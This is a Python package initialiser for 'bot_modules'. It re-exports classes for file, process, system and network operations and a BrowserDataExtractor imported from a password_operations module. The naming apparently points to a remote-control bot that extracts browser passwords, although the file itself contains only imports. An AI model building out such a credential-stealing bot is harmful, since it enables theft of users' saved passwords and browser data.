# bot_modules/__init__.py
from .files_operations import FilesOperations
from .processes_operations import ProcessesOperations
from .sys_operations import SysOperations
from .network_operations import NetworkOperations
from .password_operations import BrowserDataExtractor  # Import the correct class

__all__ = [
    "FilesOperations",
    "ProcessesOperations",
    "SysOperations",
    "NetworkOperations",
    "BrowserDataExtractor"  # Now matches the import
]
